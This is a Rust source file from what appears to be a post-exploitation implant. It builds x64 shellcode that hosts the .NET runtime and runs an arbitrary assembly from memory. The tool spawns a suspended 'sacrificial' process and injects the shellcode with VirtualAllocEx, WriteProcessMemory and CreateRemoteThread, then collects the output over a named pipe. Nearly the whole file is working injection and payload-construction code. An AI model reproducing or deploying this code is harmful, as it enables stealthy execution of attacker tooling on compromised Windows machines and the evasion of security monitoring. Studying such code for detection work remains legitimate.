        let iid_mh   = put_bytes(&mut d, &guid_bytes(0xD332DB9E,0xB9B3,0x4125,[0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16]));
        let iid_ri   = put_bytes(&mut d, &guid_bytes(0xBD39D1D2,0xBA2F,0x486A,[0x89,0xB0,0xB4,0xB0,0xCB,0x46,0x68,0x91]));
        let clsid_crh= put_bytes(&mut d, &guid_bytes(0xCB2F6723,0xAB3A,0x11D2,[0x9C,0x40,0x00,0xC0,0x4F,0xA3,0x0A,0x3E]));
        let iid_crh  = put_bytes(&mut d, &guid_bytes(0xCB2F6722,0xAB3A,0x11D2,[0x9C,0x40,0x00,0xC0,0x4F,0xA3,0x0A,0x3E]));
        let iid_ad   = put_bytes(&mut d, &guid_bytes(0x05F696DC,0x2B29,0x3663,[0xAD,0x8B,0xC4,0x38,0x9C,0xF2,0xA7,0x13]));

        // Pipe name (UTF-16).
        let pipe_off = put_wide(&mut d, pipe_name);

        // Assembly data.
        while d.len() % 8 != 0 { d.push(0); }
        let asm_len = put_u32_val(&mut d, assembly.len() as u32);
        while d.len() % 8 != 0 { d.push(0); }
        let asm_data = put_bytes(&mut d, assembly);

        // Args data: [count: u32][for each: [byte_len: u32][utf16 bytes]].
        while d.len() % 8 != 0 { d.push(0); }
        let args_count = put_u32_val(&mut d, args.len() as u32);
        while d.len() % 4 != 0 { d.push(0); }
        let args_data = d.len();
        for arg in args {
            let utf16: Vec<u16> = arg.encode_utf16().chain(std::iter::once(0)).collect();
            let byte_len = utf16.len() * 2;
            d.extend(&(byte_len as u32).to_le_bytes());
            for ch in &utf16 { d.extend(&ch.to_le_bytes()); }
        }

        let off = ShellcodeOffsets {
            fn_llw, fn_gpa, fn_cfw, fn_ssh, fn_ch, fn_et,
            str_mscoree, str_ole32, str_oleaut32, str_clr_create,
            str_co_init, str_co_uninit, str_sa_create, str_sa_access,
            str_sa_unaccess, str_sa_destroy, str_sysalloc, str_v4,
            clsid_mh, iid_mh, iid_ri, clsid_crh, iid_crh, iid_ad,
            pipe_name: pipe_off, asm_len, asm_data, args_count, args_data,
        };
        (d, off)
    }

    /// Build x64 position-independent CLR hosting shellcode.
    ///
    /// Thread entry: `rcx` = data block address (from `CreateRemoteThread` parameter).
    ///
    /// Stack locals (rsp-relative, after sub rsp,0x200):
    /// ```text
    /// 0x00..0x3F  shadow + stack params for calls
    /// 0x40        resolved CoInitializeEx
    /// 0x48        resolved SafeArrayCreateVector
    /// 0x50        resolved SafeArrayAccessData
    /// 0x58        resolved SafeArrayUnaccessData
    /// 0x60        resolved SafeArrayDestroy
    /// 0x68        resolved SysAllocString
    /// 0x70        resolved CLRCreateInstance
    /// 0x78        resolved CoUninitialize
    /// 0x80        ICLRMetaHost*
    /// 0x88        ICLRRuntimeInfo*
    /// 0x90        ICorRuntimeHost*
    /// 0x98        domain IUnknown*
    /// 0xA0        _AppDomain*
    /// 0xA8        _Assembly*
    /// 0xB0        _MethodInfo*
    /// 0xB8        byte SAFEARRAY*
    /// 0xC0        bstr SAFEARRAY*
    /// 0xC8        params SAFEARRAY*
    /// 0xD0        raw ptr temp (SafeArrayAccessData out)
    /// 0xD8..0xEF  VARIANT retval (24 bytes)
    /// 0xF0..0x107 VARIANT empty  (24 bytes, zeroed)
    /// ```
    fn build_shellcode(o: &ShellcodeOffsets) -> Vec<u8> {
        let mut c = Vec::with_capacity(2048);
        let e = |c: &mut Vec<u8>, b: &[u8]| c.extend_from_slice(b);

        // ──── Prologue: save non-volatiles, set up frame ────
        e(&mut c, &[0x55]);                                    // push rbp
        e(&mut c, &[0x53]);                                    // push rbx
        e(&mut c, &[0x41,0x54]);                               // push r12
        e(&mut c, &[0x41,0x55]);                               // push r13
        e(&mut c, &[0x41,0x56]);                               // push r14
        e(&mut c, &[0x41,0x57]);                               // push r15
        e(&mut c, &[0x57]);                                    // push rdi
        e(&mut c, &[0x56]);                                    // push rsi
        e(&mut c, &[0x48,0x89,0xE5]);                          // mov rbp, rsp
        e(&mut c, &[0x48,0x81,0xEC, 0x00,0x02,0x00,0x00]);    // sub rsp, 0x200
        e(&mut c, &[0x48,0x83,0xE4, 0xF0]);                   // and rsp, -16
        e(&mut c, &[0x48,0x89,0xCB]);                          // mov rbx, rcx

        // Zero VARIANT areas on stack (retval + empty).
        e(&mut c, &[0x31,0xC0]);                               // xor eax, eax
        for off in [0xD8usize,0xE0,0xE8,0xF0,0xF8,0x100] {
            // mov [rsp+off], rax
            e(&mut c, &[0x48,0x89,0x84,0x24]);
            c.extend(&(off as i32).to_le_bytes());
        }

        // ──── Step 1: Open named pipe (CreateFileW, 7 params) ────
        // rcx = pipe name, rdx = GENERIC_WRITE, r8 = 0, r9 = NULL
        lea_rcx_rbx(&mut c, o.pipe_name);
        e(&mut c, &[0xBA, 0x00,0x00,0x00,0x40]);              // mov edx, 0x40000000
        e(&mut c, &[0x45,0x31,0xC0]);                         // xor r8d, r8d
        e(&mut c, &[0x45,0x31,0xC9]);                         // xor r9d, r9d
        // [rsp+0x20] = 3 (OPEN_EXISTING)
        e(&mut c, &[0xC7,0x44,0x24,0x20, 0x03,0x00,0x00,0x00]);
        // [rsp+0x28] = 0
        e(&mut c, &[0xC7,0x44,0x24,0x28, 0x00,0x00,0x00,0x00]);
        // [rsp+0x30] = 0
        e(&mut c, &[0x48,0xC7,0x44,0x24,0x30, 0x00,0x00,0x00,0x00]);
        call_rbx(&mut c, o.fn_cfw);
        e(&mut c, &[0x49,0x89,0xC7]);                         // mov r15, rax (pipe handle)

        // ──── Step 2: SetStdHandle(stdout/stderr → pipe) ────
        e(&mut c, &[0xB9, 0xF5,0xFF,0xFF,0xFF]);              // mov ecx, STD_OUTPUT_HANDLE
        e(&mut c, &[0x4C,0x89,0xFA]);                         // mov rdx, r15
        call_rbx(&mut c, o.fn_ssh);
        e(&mut c, &[0xB9, 0xF4,0xFF,0xFF,0xFF]);              // mov ecx, STD_ERROR_HANDLE
        e(&mut c, &[0x4C,0x89,0xFA]);                         // mov rdx, r15
        call_rbx(&mut c, o.fn_ssh);

        // ──── Step 3: Load DLLs and resolve function pointers ────

        // ole32.dll → CoInitializeEx, CoUninitialize
        lea_rcx_rbx(&mut c, o.str_ole32);
        call_rbx(&mut c, o.fn_llw);
        e(&mut c, &[0x49,0x89,0xC4]);                         // mov r12, rax
        // CoInitializeEx
        e(&mut c, &[0x4C,0x89,0xE1]);                         // mov rcx, r12
        lea_rdx_rbx(&mut c, o.str_co_init);
        call_rbx(&mut c, o.fn_gpa);
        st_rsp_rax(&mut c, 0x40);
        // CoUninitialize
        e(&mut c, &[0x4C,0x89,0xE1]);                         // mov rcx, r12
        lea_rdx_rbx(&mut c, o.str_co_uninit);
        call_rbx(&mut c, o.fn_gpa);
        st_rsp_rax(&mut c, 0x78);

        // oleaut32.dll → SafeArray*, SysAllocString
        lea_rcx_rbx(&mut c, o.str_oleaut32);
        call_rbx(&mut c, o.fn_llw);
        e(&mut c, &[0x49,0x89,0xC5]);                         // mov r13, rax

        for &(name_off, local) in &[
            (o.str_sa_create,  0x48usize),
            (o.str_sa_access,  0x50),
            (o.str_sa_unaccess,0x58),
            (o.str_sa_destroy, 0x60),
            (o.str_sysalloc,   0x68),
        ] {
            e(&mut c, &[0x4C,0x89,0xE9]);                     // mov rcx, r13
            lea_rdx_rbx(&mut c, name_off);
            call_rbx(&mut c, o.fn_gpa);
            st_rsp_rax(&mut c, local);
        }

        // mscoree.dll → CLRCreateInstance
        lea_rcx_rbx(&mut c, o.str_mscoree);
        call_rbx(&mut c, o.fn_llw);
        e(&mut c, &[0x49,0x89,0xC6]);                         // mov r14, rax
        e(&mut c, &[0x4C,0x89,0xF1]);                         // mov rcx, r14
        lea_rdx_rbx(&mut c, o.str_clr_create);
        call_rbx(&mut c, o.fn_gpa);
        st_rsp_rax(&mut c, 0x70);

        // ──── Step 4: CoInitializeEx(NULL, 0) ────
        e(&mut c, &[0x31,0xC9]);                               // xor ecx, ecx
        e(&mut c, &[0x31,0xD2]);                               // xor edx, edx
        call_rsp(&mut c, 0x40);

        // ──── Step 5: CLRCreateInstance → ICLRMetaHost ────
        lea_rcx_rbx(&mut c, o.clsid_mh);
        lea_rdx_rbx(&mut c, o.iid_mh);
        lea_r8_rsp(&mut c, 0x80);
        call_rsp(&mut c, 0x70);

        // ──── Step 6: ICLRMetaHost::GetRuntime (slot 3) → ICLRRuntimeInfo ────
        ld_rcx_rsp(&mut c, 0x80);                             // this
        lea_rdx_rbx(&mut c, o.str_v4);
        lea_r8_rbx(&mut c, o.iid_ri);
        lea_r9_rsp(&mut c, 0x88);
        vtcall(&mut c, 3);

        // ──── Step 7: ICLRRuntimeInfo::GetInterface (slot 9) → ICorRuntimeHost ────
        ld_rcx_rsp(&mut c, 0x88);
        lea_rdx_rbx(&mut c, o.clsid_crh);
        lea_r8_rbx(&mut c, o.iid_crh);
        lea_r9_rsp(&mut c, 0x90);
        vtcall(&mut c, 9);

        // ──── Step 8: ICorRuntimeHost::Start (slot 10) ────
        ld_rcx_rsp(&mut c, 0x90);
        vtcall(&mut c, 10);

        // ──── Step 9: GetDefaultDomain (slot 13) → IUnknown ────
        ld_rcx_rsp(&mut c, 0x90);
        lea_rdx_rsp(&mut c, 0x98);
        vtcall(&mut c, 13);

        // ──── Step 10: QueryInterface → _AppDomain (slot 0) ────
        ld_rcx_rsp(&mut c, 0x98);
        lea_rdx_rbx(&mut c, o.iid_ad);
        lea_r8_rsp(&mut c, 0xA0);
        vtcall(&mut c, 0);

        // ──── Step 11: SafeArrayCreateVector(VT_UI1,0,len) + copy assembly ────
        e(&mut c, &[0xB9, 0x11,0x00,0x00,0x00]);              // mov ecx, 17 (VT_UI1)
        e(&mut c, &[0x31,0xD2]);                               // xor edx, edx
        ld_r8d_rbx(&mut c, o.asm_len);                        // r8d = assembly_len
        call_rsp(&mut c, 0x48);                                // SafeArrayCreateVector
        st_rsp_rax(&mut c, 0xB8);                             // save byte_sa

        // SafeArrayAccessData(byte_sa, &raw)
        e(&mut c, &[0x48,0x89,0xC1]);                         // mov rcx, rax
        lea_rdx_rsp(&mut c, 0xD0);
        call_rsp(&mut c, 0x50);

        // memcpy: copy assembly from data block to SAFEARRAY
        ld_rdi_rsp(&mut c, 0xD0);                             // rdi = dst
        lea_rsi_rbx(&mut c, o.asm_data);                      // rsi = src
        ld_ecx_rbx(&mut c, o.asm_len);                        // ecx = count
        e(&mut c, &[0xF3,0xA4]);                              // rep movsb

        // SafeArrayUnaccessData(byte_sa)
        ld_rcx_rsp(&mut c, 0xB8);
        call_rsp(&mut c, 0x58);

        // ──── Step 12: _AppDomain::Load_3 (slot 41) → _Assembly ────
        ld_rcx_rsp(&mut c, 0xA0);                             // this (_AppDomain)
        ld_rax_rsp(&mut c, 0xB8);                             // rdx = byte_sa
        e(&mut c, &[0x48,0x89,0xC2]);                         // mov rdx, rax
        lea_r8_rsp(&mut c, 0xA8);                             // &out
        vtcall(&mut c, 41);

        // SafeArrayDestroy(byte_sa) — no longer needed
        ld_rcx_rsp(&mut c, 0xB8);
        call_rsp(&mut c, 0x60);

        // ──── Step 13: _Assembly::get_EntryPoint (slot 16) → _MethodInfo ────
        ld_rcx_rsp(&mut c, 0xA8);
        lea_rdx_rsp(&mut c, 0xB0);
        vtcall(&mut c, 16);

        // ──── Step 14: Build params SAFEARRAY for Invoke_3 ────
        ld_r14d_rbx(&mut c, o.args_count);                    // r14d = args_count
        e(&mut c, &[0x45,0x85,0xF6]);                         // test r14d, r14d
        // jz → no_args (patch later)
        let jz_no_args = c.len();
        e(&mut c, &[0x0F,0x84, 0x00,0x00,0x00,0x00]);

        // ── Build BSTR SAFEARRAY(VT_BSTR, 0, args_count) ──
        e(&mut c, &[0xB9, 0x08,0x00,0x00,0x00]);              // mov ecx, 8 (VT_BSTR)
        e(&mut c, &[0x31,0xD2]);                               // xor edx, edx
        e(&mut c, &[0x45,0x89,0xF0]);                         // mov r8d, r14d
        call_rsp(&mut c, 0x48);
        st_rsp_rax(&mut c, 0xC0);                             // bstr_sa

        // SafeArrayAccessData
        e(&mut c, &[0x48,0x89,0xC1]);                         // mov rcx, rax
        lea_rdx_rsp(&mut c, 0xD0);
        call_rsp(&mut c, 0x50);

        // Loop: SysAllocString for each arg
        ld_rsi_rsp(&mut c, 0xD0);                             // rsi = BSTR* array
        lea_rdi_rbx(&mut c, o.args_data);                     // rdi = args data ptr
        e(&mut c, &[0x45,0x31,0xE4]);                         // xor r12d, r12d (i=0)

        let loop_top = c.len();
        e(&mut c, &[0x45,0x39,0xF4]);                         // cmp r12d, r14d
        // jge → args_done (patch later)
        let jge_args_done = c.len();
        e(&mut c, &[0x0F,0x8D, 0x00,0x00,0x00,0x00]);

        e(&mut c, &[0x44,0x8B,0x2F]);                         // mov r13d, [rdi] (byte_len)
        e(&mut c, &[0x48,0x83,0xC7,0x04]);                    // add rdi, 4
        e(&mut c, &[0x48,0x89,0xF9]);                         // mov rcx, rdi (utf16 ptr)
        call_rsp(&mut c, 0x68);                                // SysAllocString → rax
        e(&mut c, &[0x48,0x89,0x06]);                         // mov [rsi], rax
        e(&mut c, &[0x48,0x83,0xC6,0x08]);                    // add rsi, 8
        e(&mut c, &[0x4C,0x01,0xEF]);                         // add rdi, r13
        e(&mut c, &[0x41,0xFF,0xC4]);                         // inc r12d
        // jmp → loop_top
        let jmp_back = c.len();
        e(&mut c, &[0xE9, 0x00,0x00,0x00,0x00]);
        let jmp_target = loop_top as i32 - (c.len() as i32);
        c[jmp_back+1..jmp_back+5].copy_from_slice(&jmp_target.to_le_bytes());

        // Patch jge → args_done
        let args_done = c.len();
        let delta = args_done as i32 - (jge_args_done as i32 + 6);
        c[jge_args_done+2..jge_args_done+6].copy_from_slice(&delta.to_le_bytes());

        // SafeArrayUnaccessData(bstr_sa)
        ld_rcx_rsp(&mut c, 0xC0);
        call_rsp(&mut c, 0x58);

        // ── Build outer SAFEARRAY(VT_VARIANT, 0, 1) with VARIANT(VT_ARRAY|VT_BSTR) ──
        e(&mut c, &[0xB9, 0x0C,0x00,0x00,0x00]);              // mov ecx, 12 (VT_VARIANT)
        e(&mut c, &[0x31,0xD2]);                               // xor edx, edx
        e(&mut c, &[0x41,0xB8, 0x01,0x00,0x00,0x00]);         // mov r8d, 1
        call_rsp(&mut c, 0x48);
        st_rsp_rax(&mut c, 0xC8);                             // params_sa

        // SafeArrayAccessData(params_sa, &raw)
        e(&mut c, &[0x48,0x89,0xC1]);
        lea_rdx_rsp(&mut c, 0xD0);
        call_rsp(&mut c, 0x50);

        // Write VARIANT { vt=0x2008, data=bstr_sa } at raw ptr
        ld_rdi_rsp(&mut c, 0xD0);
        e(&mut c, &[0x66,0xC7,0x07, 0x08,0x20]);              // mov word [rdi], 0x2008
        e(&mut c, &[0xC7,0x47,0x02, 0x00,0x00,0x00,0x00]);    // mov dword [rdi+2], 0
        e(&mut c, &[0x66,0xC7,0x47,0x06, 0x00,0x00]);         // mov word [rdi+6], 0
        ld_rax_rsp(&mut c, 0xC0);                             // rax = bstr_sa
        e(&mut c, &[0x48,0x89,0x47,0x08]);                    // mov [rdi+8], rax
        e(&mut c, &[0x31,0xC0]);                               // xor eax, eax
        e(&mut c, &[0x48,0x89,0x47,0x10]);                    // mov [rdi+16], rax

        // SafeArrayUnaccessData(params_sa)
        ld_rcx_rsp(&mut c, 0xC8);
        call_rsp(&mut c, 0x58);

        // jmp → invoke
        let jmp_invoke = c.len();
        e(&mut c, &[0xE9, 0x00,0x00,0x00,0x00]);

        // ── no_args: empty SAFEARRAY(VT_VARIANT, 0, 0) ──
        let no_args_pos = c.len();
        let delta = no_args_pos as i32 - (jz_no_args as i32 + 6);
        c[jz_no_args+2..jz_no_args+6].copy_from_slice(&delta.to_le_bytes());

        e(&mut c, &[0xB9, 0x0C,0x00,0x00,0x00]);              // mov ecx, 12 (VT_VARIANT)
        e(&mut c, &[0x31,0xD2]);                               // xor edx, edx
        e(&mut c, &[0x45,0x31,0xC0]);                         // xor r8d, r8d
        call_rsp(&mut c, 0x48);
        st_rsp_rax(&mut c, 0xC8);                             // params_sa (empty)

        // Patch jmp → invoke
        let invoke_pos = c.len();
        let delta = invoke_pos as i32 - (jmp_invoke as i32 + 5);
        c[jmp_invoke+1..jmp_invoke+5].copy_from_slice(&delta.to_le_bytes());

        // ──── Step 15: _MethodInfo::Invoke_3 (slot 37) ────
        // Invoke_3(this, VARIANT obj, SAFEARRAY* params, VARIANT* retval)
        // On x64, VARIANT (24 bytes) passed by implicit pointer.
        ld_rcx_rsp(&mut c, 0xB0);                             // this (_MethodInfo)
        lea_rdx_rsp(&mut c, 0xF0);                            // &empty_variant
        ld_rax_rsp(&mut c, 0xC8);
        e(&mut c, &[0x49,0x89,0xC0]);                         // mov r8, rax (params_sa)
        lea_r9_rsp(&mut c, 0xD8);                             // &retval
        vtcall(&mut c, 37);

        // If failed, retry with empty params (for parameterless Main).
        e(&mut c, &[0x85,0xC0]);                               // test eax, eax
        // jns → invoke_done (skip retry)
        let jns_done = c.len();
        e(&mut c, &[0x0F,0x89, 0x00,0x00,0x00,0x00]);

        // Retry: empty SAFEARRAY(VT_VARIANT, 0, 0)
        e(&mut c, &[0xB9, 0x0C,0x00,0x00,0x00]);
        e(&mut c, &[0x31,0xD2]);
        e(&mut c, &[0x45,0x31,0xC0]);
        call_rsp(&mut c, 0x48);
        e(&mut c, &[0x49,0x89,0xC0]);                         // mov r8, rax

        ld_rcx_rsp(&mut c, 0xB0);
        lea_rdx_rsp(&mut c, 0xF0);
        lea_r9_rsp(&mut c, 0xD8);
        vtcall(&mut c, 37);

        // Patch jns → invoke_done
        let invoke_done = c.len();
        let delta = invoke_done as i32 - (jns_done as i32 + 6);
        c[jns_done+2..jns_done+6].copy_from_slice(&delta.to_le_bytes());

        // ──── Step 16: Cleanup + ExitThread(0) ────
        // Close pipe handle
        e(&mut c, &[0x4C,0x89,0xF9]);                         // mov rcx, r15
        call_rbx(&mut c, o.fn_ch);

        // ExitThread(0)
        e(&mut c, &[0x31,0xC9]);                               // xor ecx, ecx
        call_rbx(&mut c, o.fn_et);

        c
    }

    /// Build the complete CLR payload: `(code, data)` both as byte vectors.
    /// The caller must patch kernel32 function pointers into the data block
    /// before injection.
    fn build_clr_payload(
        assembly: &[u8],
        args: &[String],
        pipe_name: &str,
    ) -> (Vec<u8>, Vec<u8>, ShellcodeOffsets) {
        let (data, off) = build_data_block(assembly, args, pipe_name);
        let code = build_shellcode(&off);
        (code, data, off)
    }

    /// Patch pre-resolved kernel32 function pointers into the data block.
    unsafe fn patch_fn_pointers(data: &mut [u8], off: &ShellcodeOffsets) {
        let k32 = LoadLibraryW(wide("kernel32.dll").as_ptr());
        let r = |name: &[u8]| GetProcAddress(k32, name.as_ptr()) as u64;
        let p = |d: &mut [u8], o: usize, v: u64| {
            d[o..o+8].copy_from_slice(&v.to_le_bytes());
        };
        p(data, off.fn_llw, r(b"LoadLibraryW\0"));
        p(data, off.fn_gpa, r(b"GetProcAddress\0"));
        p(data, off.fn_cfw, r(b"CreateFileW\0"));
        p(data, off.fn_ssh, r(b"SetStdHandle\0"));
        p(data, off.fn_ch,  r(b"CloseHandle\0"));
        p(data, off.fn_et,  r(b"ExitThread\0"));
    }

    /// Spawn+execute: run .NET assembly in a sacrificial process.
    ///
    /// 1. Create named pipe for output capture.
    /// 2. Spawn sacrificial process (CREATE_SUSPENDED).
    /// 3. Inject CLR hosting shellcode + assembly data.
    /// 4. CreateRemoteThread → child hosts CLR, runs assembly, writes to pipe.
    /// 5. Parent reads pipe, waits for child, returns output.
    unsafe fn execute_assembly_spawn_inner(
        assembly: &[u8],
        args: &[String],
        spawn_exe: Option<&str>,
    ) -> Result<(i32, String, String)> {
        // 1. Create named pipe (parent reads, child writes).
        let pipe_name = random_pipe_name();
        let pipe_w = wide(&pipe_name);
        let pipe = CreateNamedPipeW(
            pipe_w.as_ptr(),
            PIPE_ACCESS_INBOUND,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            1,      // max instances
            0,      // out buffer
            65536,  // in buffer
            60000,  // default timeout ms
            null(),
        );
        if pipe == INVALID_HANDLE {
            return Err(anyhow!("CreateNamedPipeW: error {}", GetLastError()));
        }

        // 2. Build shellcode + data payload.
        let (code, mut data, off) = build_clr_payload(assembly, args, &pipe_name);
        patch_fn_pointers(&mut data, &off);

        // 3. Spawn sacrificial process.
        let exe = spawn_exe.unwrap_or(DEFAULT_SPAWN);
        let exe_w = wide(exe);
        let mut si: StartupInfoW = std::mem::zeroed();
        si.cb = std::mem::size_of::<StartupInfoW>() as u32;
        let mut pi: ProcessInformation = std::mem::zeroed();

        if CreateProcessW(
            exe_w.as_ptr(), null_mut(), null(), null(),
            0, CREATE_SUSPENDED, null(), null(), &si, &mut pi,
        ) == 0 {
            CloseHandle(pipe);
            return Err(anyhow!("CreateProcessW('{}'): error {}", exe, GetLastError()));
        }

        // Cleanup helper.
        macro_rules! abort {
            ($msg:expr) => {{
                TerminateProcess(pi.h_process, 1);
                CloseHandle(pi.h_thread);
                CloseHandle(pi.h_process);
                CloseHandle(pipe);
                return Err(anyhow!($msg));
            }};
        }

        // 4. Inject data block (RW).
        let data_remote = VirtualAllocEx(
            pi.h_process, null(), data.len(),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
        );
        if data_remote.is_null() {
            abort!(format!("VirtualAllocEx(data): error {}", GetLastError()));
        }
        let mut written: usize = 0;
        if WriteProcessMemory(
            pi.h_process, data_remote, data.as_ptr().cast(), data.len(), &mut written,
        ) == 0 {
            abort!(format!("WriteProcessMemory(data): error {}", GetLastError()));
        }

        // 5. Inject code block (RW → RX).
        let code_remote = VirtualAllocEx(
            pi.h_process, null(), code.len(),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
        );
        if code_remote.is_null() {
            abort!(format!("VirtualAllocEx(code): error {}", GetLastError()));
        }
        if WriteProcessMemory(
            pi.h_process, code_remote, code.as_ptr().cast(), code.len(), &mut written,
        ) == 0 {
            abort!(format!("WriteProcessMemory(code): error {}", GetLastError()));
        }
        let mut old_prot: u32 = 0;
        if VirtualProtectEx(
            pi.h_process, code_remote, code.len(), PAGE_EXECUTE_READ, &mut old_prot,
        ) == 0 {
            abort!(format!("VirtualProtectEx: error {}", GetLastError()));
        }

        // 6. CreateRemoteThread: entry=code, param=data block address.
        let thread = CreateRemoteThread(
            pi.h_process, null(), 0,
            code_remote, data_remote,
            0, null_mut(),
        );
        if thread == 0 {
            abort!(format!("CreateRemoteThread: error {}", GetLastError()));
        }

        // 7. Resume main thread (needed for CRT/ntdll init in child).
        ResumeThread(pi.h_thread);

        // 8. Wait for pipe client to connect then read output.
        ConnectNamedPipe(pipe, null_mut());
        let output = drain_pipe(pipe);

        // 9. Wait for injected thread to finish (120s max).
        WaitForSingleObject(thread, 120_000);

        // 10. Cleanup.
        TerminateProcess(pi.h_process, 0);
        CloseHandle(thread);
        CloseHandle(pi.h_thread);
        CloseHandle(pi.h_process);
        CloseHandle(pipe);

        Ok((
            0,
            format!(
                "[*] Spawned '{}' (PID {}), assembly executed\n{}",
                exe, pi.dw_process_id, output
            ),
            String::new(),
        ))
    }

    /// Spawn+execute mode: async wrapper with 120-second timeout.
    pub async fn execute_assembly_spawn(
        assembly_bytes: Vec<u8>,
        args: Vec<String>,
        spawn_exe: Option<String>,
    ) -> Result<(i32, String, String)> {
        let handle = tokio::task::spawn_blocking(move || unsafe {
            execute_assembly_spawn_inner(&assembly_bytes, &args, spawn_exe.as_deref())
        });
        match tokio::time::timeout(std::time::Duration::from_secs(120), handle).await {
            Ok(Ok(result)) => result,
            Ok(Err(e)) => Ok((1, String::new(), format!("spawn-assembly panicked: {}", e))),
            Err(_) => Ok((
                1,
                String::new(),
                "spawn-execute-assembly timed out (120s)".to_string(),
            )),
        }
    }

    /// Top-level dispatch: inline vs spawn+execute mode.
    pub async fn execute_assembly(
        assembly_bytes: Vec<u8>,
        args: Vec<String>,
        inline: bool,
        spawn_exe: Option<String>,
    ) -> Result<(i32, String, String)> {
        if inline {
            execute_assembly_inline(assembly_bytes, args).await
        } else {
            execute_assembly_spawn(assembly_bytes, args, spawn_exe).await
        }
    }
}

// ─── Non-Windows stub ────────────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
mod stub {
    pub async fn execute_assembly(
        _assembly_bytes: Vec<u8>,
        _args: Vec<String>,
        _inline: bool,
        _spawn_exe: Option<String>,
    ) -> anyhow::Result<(i32, String, String)> {
        Ok((
            1,
            String::new(),
            "execute-assembly requires Windows".to_string(),
        ))
    }
}

#[cfg(target_os = "windows")]
pub use win::execute_assembly;

#[cfg(not(target_os = "windows"))]
pub use stub::execute_assembly;
